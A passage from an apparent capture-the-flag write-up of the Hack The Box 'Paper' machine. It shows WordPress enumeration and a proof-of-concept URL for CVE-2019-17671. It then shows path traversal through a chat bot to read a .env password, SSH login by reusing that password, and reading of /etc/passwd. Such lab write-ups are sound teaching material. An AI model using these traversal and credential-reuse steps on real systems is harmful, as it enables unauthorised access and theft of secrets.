+Host is up <span class="o">(</span>0.040s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 199 closed udp ports <span class="o">(</span>port-unreach<span class="o">)</span>
+PORT     STATE         SERVICE
+5353/udp open|filtered zeroconf
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>208.18 seconds
+</pre></td></tr></tbody></table></code></div></div>
+
+<h2 id="enumeration"><span class="me-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<h3 id="port-80---http-apache-httpd-2437-centos-openssl111k-mod_fcgid239"><span class="me-2">Port 80 - HTTP (Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9))</span><a href="#port-80---http-apache-httpd-2437-centos-openssl111k-mod_fcgid239" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>Browsed port 80:</p>
+
+<p><a href="/assets/img/Paper/Untitled.png" class="popup img-link shimmer"><img src="/assets/img/Paper/Untitled.png" alt="Untitled" loading="lazy"></a></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre>HTTP/1.1 403 Forbidden
+Date: Sat, 07 May 2022 21:41:58 GMT
+Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+X-Backend-Server: office.paper
+Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
+ETag: "30c0b-5c5c7fdeec240"
+Accept-Ranges: bytes
+Content-Length: 199691
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+</pre></td></tr></tbody></table></code></div></div>
+<p>Discovered the domain <strong>office.paper</strong>.</p>
+
+<p>Enumerated web files and directories:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.11.143 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt <span class="nt">-t</span> 25 <span class="nt">-o</span> scan/p80-dirs.txt
+...
+/manual               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 235] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.11.143/manual/]
+
+<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.11.143 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt <span class="nt">-t</span> 25 <span class="nt">-o</span> scan/p80-files.txt
+...
+/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/.                    <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199691]
+/.html                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/.htm                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/.htpasswds           <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/.htgroup             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/poweredby.png        <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 5714]
+/.htaccess.bak        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/.htuser              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/.htc                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/.ht                  <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/dispatch.fcgi        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/mytias.fcgi          <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/test.fcgi            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+</pre></td></tr></tbody></table></code></div></div>
+
+<h4 id="officepaper---wordpress-523"><span class="me-2">office.paper - (wordpress 5.2.3)</span><a href="#officepaper---wordpress-523" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
+
+<p>Added <strong>office.paper</strong> to <strong>/etc/hosts</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="c">## echo '10.10.11.143    office.paper' &gt;&gt; /etc/hosts</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p><a href="/assets/img/Paper/Untitled%201.png" class="popup img-link shimmer"><img src="/assets/img/Paper/Untitled%201.png" alt="Untitled" loading="lazy"></a></p>
+
+<p>Enumerated posts and comments:</p>
+
+<p><a href="http://office.paper/?s=">http://office.paper/?s=</a></p>
+
+<p><a href="/assets/img/Paper/Untitled%202.png" class="popup img-link shimmer"><img src="/assets/img/Paper/Untitled%202.png" alt="Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick" loading="lazy"></a></p>
+
+<blockquote>
+  <p>Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick</p>
+</blockquote>
+
+<p><a href="/assets/img/Paper/Untitled%203.png" class="popup img-link shimmer"><img src="/assets/img/Paper/Untitled%203.png" alt="Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think! -Nick" loading="lazy"></a></p>
+
+<blockquote>
+  <p>Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think! -Nick</p>
+</blockquote>
+
+<ul>
+  <li>
+    <p>Enumerated wordpress using <strong>wpscan</strong>:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+</pre></td><td class="rouge-code"><pre>  ┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/CTFs/HTB/B2R/Paper]
+  └─<span class="nv">$ </span>wpscan <span class="nt">--url</span> office.paper
+  ...
+  <span class="o">[</span>+] URL: http://office.paper/ <span class="o">[</span>10.10.11.143]
+  <span class="o">[</span>+] Started: Sat May  7 17:54:40 2022
+    
+  Interesting Finding<span class="o">(</span>s<span class="o">)</span>:
+    
+  <span class="o">[</span>+] Headers
+   | Interesting Entries:
+   |  - Server: Apache/2.4.37 <span class="o">(</span>centos<span class="o">)</span> OpenSSL/1.1.1k mod_fcgid/2.3.9
+   |  - X-Powered-By: PHP/7.2.24
+   |  - X-Backend-Server: office.paper
+   | Found By: Headers <span class="o">(</span>Passive Detection<span class="o">)</span>
+   | Confidence: 100%
+    
+  <span class="o">[</span>+] WordPress readme found: http://office.paper/readme.html
+   | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+   | Confidence: 100%
+    
+  <span class="o">[</span>+] WordPress version 5.2.3 identified <span class="o">(</span>Insecure, released on 2019-09-05<span class="o">)</span><span class="nb">.</span>
+   | Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+   |  - http://office.paper/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>5.2.3&lt;/generator&gt;
+   |  - http://office.paper/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>5.2.3&lt;/generator&gt;
+    
+  <span class="o">[</span>+] WordPress theme <span class="k">in </span>use: construction-techup
+   | Location: http://office.paper/wp-content/themes/construction-techup/
+   | Last Updated: 2021-07-17T00:00:00.000Z
+   | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
+   | <span class="o">[!]</span> The version is out of <span class="nb">date</span>, the latest version is 1.4
+   | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver<span class="o">=</span>1.1
+   | Style Name: Construction Techup
+   | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful <span class="k">for </span>Business, corporate a...
+   | Author: wptexture
+   | Author URI: https://testerwp.com/
+   |
+   | Found By: Css Style In Homepage <span class="o">(</span>Passive Detection<span class="o">)</span>
+   |
+   | Version: 1.1 <span class="o">(</span>80% confidence<span class="o">)</span>
+   | Found By: Style <span class="o">(</span>Passive Detection<span class="o">)</span>
+   |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver<span class="o">=</span>1.1, Match: <span class="s1">'Version: 1.1'</span>
+    
+  <span class="o">[</span>+] Enumerating All Plugins <span class="o">(</span>via Passive Methods<span class="o">)</span>
+    
+  <span class="o">[</span>i] No plugins Found.
+    
+  <span class="o">[</span>+] Enumerating Config Backups <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
+   Checking Config Backups - Time: 00:00:01 &lt;<span class="o">=============================================================================================================================================================&gt;</span> <span class="o">(</span>137 / 137<span class="o">)</span> 100.00% Time: 00:00:01
+    
+  <span class="o">[</span>i] No Config Backups Found.
+    
+  <span class="o">[!]</span> No WPScan API Token given, as a result vulnerability data has not been output.
+  <span class="o">[!]</span> You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+    
+  <span class="o">[</span>+] Finished: Sat May  7 17:54:44 2022
+  <span class="o">[</span>+] Requests Done: 139
+  <span class="o">[</span>+] Cached Requests: 35
+  <span class="o">[</span>+] Data Sent: 34.539 KB
+  <span class="o">[</span>+] Data Received: 28.126 KB
+  <span class="o">[</span>+] Memory used: 231.141 MB
+  <span class="o">[</span>+] Elapsed <span class="nb">time</span>: 00:00:04
+    
+  ┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/CTFs/HTB/B2R/Paper]                                                                                                                                                                                                      
+  └─<span class="nv">$ </span>wpscan <span class="nt">--url</span> office.paper <span class="nt">-e</span> ap,vt,cb,dbe,u <span class="nt">--plugins-version-detection</span> aggressive <span class="nt">--plugins-detection</span> aggressive
+  ...
+  <span class="o">[</span>+] prisonmike
+   | Found By: Author Posts - Author Pattern <span class="o">(</span>Passive Detection<span class="o">)</span>
+   | Confirmed By:
+   |  Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+   |  Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+   |   - http://office.paper/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100&amp;page<span class="o">=</span>1
+   |  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+   |  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+    
+  <span class="o">[</span>+] nick
+   | Found By: Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+   |  - http://office.paper/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100&amp;page<span class="o">=</span>1
+   | Confirmed By:
+   |  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+   |  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+    
+  <span class="o">[</span>+] creedthoughts
+   | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+   | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</pre></td></tr></tbody></table></code></div>    </div>
+  </li>
+</ul>
+
+<h4 id="chatofficepaper-discovered-exploiting-unauthenticated-view-privatedraft-posts"><span class="me-2">chat.office.paper (discovered exploiting Unauthenticated View Private/Draft Posts)</span><a href="#chatofficepaper-discovered-exploiting-unauthenticated-view-privatedraft-posts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
+<p>Browsed <strong>chat.office.paper</strong>:</p>
+
+<p><a href="/assets/img/Paper/Untitled%204.png" class="popup img-link shimmer"><img src="/assets/img/Paper/Untitled%204.png" alt="Untitled" loading="lazy"></a></p>
+
+<p>Browsed the secret path, registered a user and enumerated private chats:</p>
+
+<p><a href="http://chat.office.paper/register/8qozr226AhkCHZdyY">http://chat.office.paper/register/8qozr226AhkCHZdyY</a></p>
+
+<p><a href="/assets/img/Paper/Untitled%205.png" class="popup img-link shimmer"><img src="/assets/img/Paper/Untitled%205.png" alt="Untitled" loading="lazy"></a></p>
+
+<aside>
+🔑 0xbro     maoutis
+
+</aside>
+
+<p><a href="/assets/img/Paper/Untitled%206.png" class="popup img-link shimmer"><img src="/assets/img/Paper/Untitled%206.png" alt="Untitled" loading="lazy"></a></p>
+
+<p><a href="/assets/img/Paper/Untitled%207.png" class="popup img-link shimmer"><img src="/assets/img/Paper/Untitled%207.png" alt="Untitled" loading="lazy"></a></p>
+
+<p><a href="/assets/img/Paper/Untitled%208.png" class="popup img-link shimmer"><img src="/assets/img/Paper/Untitled%208.png" alt="Untitled" loading="lazy"></a></p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre></td><td class="rouge-code"><pre>recyclops Bot 11:21 AM
+kellylikescupcakes Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to <span class="nb">help </span>my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable <span class="nb">time </span>to... well, not interact with his co-workers.
+Most frequently asked questions include:
+- What <span class="nb">time </span>is it?
+- What new files are <span class="k">in </span>your sales directory?
+- Why did the salesman crossed the road?
+- What<span class="s1">'s the content of file x in your sales directory? etc.
+Please note that I am a beta version and I still have some bugs to be fixed.
+How to use me ? :
+1. Small Talk:
+You can ask me how dwight'</span>s weekend was, or did he watched the game last night etc.
+eg: <span class="s1">'recyclops how was your weekend?'</span> or <span class="s1">'recyclops did you watched the game last night?'</span> or <span class="s1">'recyclops what kind of bear is the best?
+2. Joke:
+You can ask me Why the salesman crossed the road.
+eg: '</span>recyclops why did the salesman crossed the road?<span class="s1">'
+&lt;=====The following two features are for those boneheads, who still don'</span>t know how to use scp. I<span class="s1">'m Looking at you Kevin.=====&gt;
+For security reasons, the access is limited to the Sales folder.
+3. Files:
+eg: '</span>recyclops get me the file test.txt<span class="s1">', or '</span>recyclops could you send me the file src/test.php<span class="s1">' or just '</span>recyclops file test.txt<span class="s1">'
+4. List:
+You can ask me to list the files
+5. Time:
+You can ask me to what the time is
+</span></pre></td></tr></tbody></table></code></div></div>
+
+<h2 id="exploitation"><span class="me-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<h3 id="wordpress--523---unauthenticated-view-privatedraft-posts-cve-2019-17671"><span class="me-2">WordPress &lt;= 5.2.3 - Unauthenticated View Private/Draft Posts (CVE-2019-17671)</span><a href="#wordpress--523---unauthenticated-view-privatedraft-posts-cve-2019-17671" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p><a href="https://wpscan.com/vulnerability/9909"></a></p>
+
+<p>PoC: <a href="http://office.paper/?static=1">http://office.paper/?static=1</a></p>
+
+<p><a href="/assets/img/Paper/Untitled%209.png" class="popup img-link shimmer"><img src="/assets/img/Paper/Untitled%209.png" alt="Untitled" loading="lazy"></a></p>
+
+<h3 id="exploiting-recyclops-features"><span class="me-2">Exploiting recyclops features</span><a href="#exploiting-recyclops-features" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p><a href="/assets/img/Paper/Untitled%2010.png" class="popup img-link shimmer"><img src="/assets/img/Paper/Untitled%2010.png" alt="Untitled" loading="lazy"></a></p>
+
+<p><a href="/assets/img/Paper/Untitled%2011.png" class="popup img-link shimmer"><img src="/assets/img/Paper/Untitled%2011.png" alt="Untitled" loading="lazy"></a></p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>list ..
+Fetching the directory listing of ..
+total 32
+drwx------ 11 dwight dwight 281 Feb 6 07:46 <span class="nb">.</span>
+drwxr-xr-x. 3 root root 20 Jan 14 06:50 ..
+lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -&gt; /dev/null
+<span class="nt">-rw-r--r--</span> 1 dwight dwight 18 May 10 2019 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 dwight dwight 141 May 10 2019 .bash_profile
+<span class="nt">-rw-r--r--</span> 1 dwight dwight 358 Jul 3 2021 .bashrc
+<span class="nt">-rwxr-xr-x</span> 1 dwight dwight 1174 Sep 16 2021 bot_restart.sh
+drwx------ 5 dwight dwight 56 Jul 3 2021 .config
+<span class="nt">-rw-------</span> 1 dwight dwight 16 Jul 3 2021 .esd_auth
+drwx------ 2 dwight dwight 44 Jul 3 2021 .gnupg
+drwx------ 8 dwight dwight 4096 Sep 16 2021 hubot
+<span class="nt">-rw-rw-r--</span> 1 dwight dwight 18 Sep 16 2021 .hubot_history
+drwx------ 3 dwight dwight 19 Jul 3 2021 .local
+drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla
+drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm
+drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales
+drwx------ 2 dwight dwight 6 Sep 16 2021 .ssh
+<span class="nt">-r--------</span> 1 dwight dwight 33 May 7 17:23 user.txt
+drwxr-xr-x 2 dwight dwight 24 Sep 16 2021 .vim
+total 32
+
+<span class="nv">$ </span>list ../hubot
+drwx------ 8 dwight dwight 4096 Sep 16 2021 <span class="nb">.</span>
+drwx------ 11 dwight dwight 281 Feb 6 07:46 ..
+<span class="nt">-rw-r--r--</span> 1 dwight dwight 0 Jul 3 2021 <span class="se">\</span>
+srwxr-xr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8000
+srwxrwxr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8080
+drwx--x--x 2 dwight dwight 36 Sep 16 2021 bin
+<span class="nt">-rw-r--r--</span> 1 dwight dwight 258 Sep 16 2021 .env
+<span class="nt">-rwxr-xr-x</span> 1 dwight dwight 2 Jul 3 2021 external-scripts.json
+drwx------ 8 dwight dwight 163 Jul 3 2021 .git
+<span class="nt">-rw-r--r--</span> 1 dwight dwight 917 Jul 3 2021 .gitignore
+<span class="nt">-rw-r--r--</span> 1 dwight dwight 135675 May 7 18:47 .hubot.log
+<span class="nt">-rwxr-xr-x</span> 1 dwight dwight 1068 Jul 3 2021 LICENSE
+drwxr-xr-x 89 dwight dwight 4096 Jul 3 2021 node_modules
+drwx--x--x 115 dwight dwight 4096 Jul 3 2021 node_modules_bak
+<span class="nt">-rwxr-xr-x</span> 1 dwight dwight 1062 Sep 16 2021 package.json
+<span class="nt">-rwxr-xr-x</span> 1 dwight dwight 972 Sep 16 2021 package.json.bak
+<span class="nt">-rwxr-xr-x</span> 1 dwight dwight 30382 Jul 3 2021 package-lock.json
+<span class="nt">-rwxr-xr-x</span> 1 dwight dwight 14 Jul 3 2021 Procfile
+<span class="nt">-rwxr-xr-x</span> 1 dwight dwight 5044 Jul 3 2021 README.md
+drwx--x--x 2 dwight dwight 193 Jan 13 10:56 scripts
+<span class="nt">-rwxr-xr-x</span> 1 dwight dwight 100 Jul 3 2021 start_bot.sh
+drwx------ 2 dwight dwight 25 Jul 3 2021 .vscode
+<span class="nt">-rwxr-xr-x</span> 1 dwight dwight 29951 Jul 3 2021 yarn.lock
+
+<span class="nv">$ </span>file ../hubot/.env
+&lt;<span class="o">!=====</span>Contents of file ../hubot/.env<span class="o">=====&gt;</span>
+<span class="nb">export </span><span class="nv">ROCKETCHAT_URL</span><span class="o">=</span><span class="s1">'http://127.0.0.1:48320'</span>
+<span class="nb">export </span><span class="nv">ROCKETCHAT_USER</span><span class="o">=</span>recyclops
+<span class="nb">export </span><span class="nv">ROCKETCHAT_PASSWORD</span><span class="o">=</span>Queenofblad3s!23
+<span class="nb">export </span><span class="nv">ROCKETCHAT_USESSL</span><span class="o">=</span><span class="nb">false
+export </span><span class="nv">RESPOND_TO_DM</span><span class="o">=</span><span class="nb">true
+export </span><span class="nv">RESPOND_TO_EDITED</span><span class="o">=</span><span class="nb">true
+export </span><span class="nv">PORT</span><span class="o">=</span>8000
+<span class="nb">export </span><span class="nv">BIND_ADDRESS</span><span class="o">=</span>127.0.0.1
+&lt;<span class="o">!=====</span>End of file ../hubot/.env<span class="o">=====&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<aside>
+🔑 recyclops     Queenofblad3s!23
+dwight     Queenofblad3s!23
+
+</aside>
+
+<p>Logged in trough SSH re-using recyclops password:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre></td><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/CTFs/HTB/B2R/Paper]
+└─<span class="nv">$ </span>ssh dwight@office.paper
+dwight@office.paper<span class="s1">'s password:
+Activate the web console with: systemctl enable --now cockpit.socket
+
+Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
+[dwight@paper ~]$ id; hostname; ip a; cat /home/dwight/user.txt
+uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
+paper
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:b9:e7:ed brd ff:ff:ff:ff:ff:ff
+    inet 10.10.11.143/23 brd 10.10.11.255 scope global noprefixroute eth0
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef::250:56ff:feb9:e7ed/64 scope global dynamic mngtmpaddr
+       valid_lft 86399sec preferred_lft 14399sec
+    inet6 fe80::250:56ff:feb9:e7ed/64 scope link
+       valid_lft forever preferred_lft forever
+3: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default qlen 1000
+    link/ether 52:54:00:9b:e7:f7 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0
+       valid_lft forever preferred_lft forever
+4: virbr0-nic: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc fq_codel master virbr0 state DOWN group default qlen 1000
+    link/ether 52:54:00:9b:e7:f7 brd ff:ff:ff:ff:ff:ff
+83482a8c2adcc4a365993c3653dc9517
+</span></pre></td></tr></tbody></table></code></div></div>
+
+<h2 id="privilege-escalation"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<h3 id="local-enumeration"><span class="me-2">Local enumeration</span><a href="#local-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>Enumerated local users:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+</pre></td><td class="rouge-code"><pre><span class="o">[</span>dwight@paper ~]<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+<span class="nb">sync</span>:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
+systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
+tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+polkitd:x:998:996:User <span class="k">for </span>polkitd:/:/sbin/nologin
+geoclue:x:997:994:User <span class="k">for </span>geoclue:/var/lib/geoclue:/sbin/nologin
+rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin
+qemu:x:107:107:qemu user:/:/sbin/nologin
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+cockpit-ws:x:996:993:User <span class="k">for </span>cockpit-ws:/:/sbin/nologin
+pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
+usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin
+unbound:x:995:990:Unbound DNS resolver:/etc/unbound:/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+gluster:x:994:989:GlusterFS daemons:/run/gluster:/sbin/nologin
+chrony:x:993:987::/var/lib/chrony:/sbin/nologin
+libstoragemgmt:x:992:986:daemon account <span class="k">for </span>libstoragemgmt:/var/run/lsm:/sbin/nologin
+saslauth:x:991:76:Saslauthd user:/run/saslauthd:/sbin/nologin
+dnsmasq:x:985:985:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
+radvd:x:75:75:radvd user:/:/sbin/nologin
+clevis:x:984:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin
+pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
+sssd:x:983:981:User <span class="k">for </span>sssd:/:/sbin/nologin
+colord:x:982:980:User <span class="k">for </span>colord:/var/lib/colord:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+setroubleshoot:x:981:979::/var/lib/setroubleshoot:/sbin/nologin
+pipewire:x:980:978:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin
+gdm:x:42:42::/var/lib/gdm:/sbin/nologin
+gnome-initial-setup:x:979:977::/run/gnome-initial-setup/:/sbin/nologin
+insights:x:978:976:Red Hat Insights:/var/lib/insights:/sbin/nologin
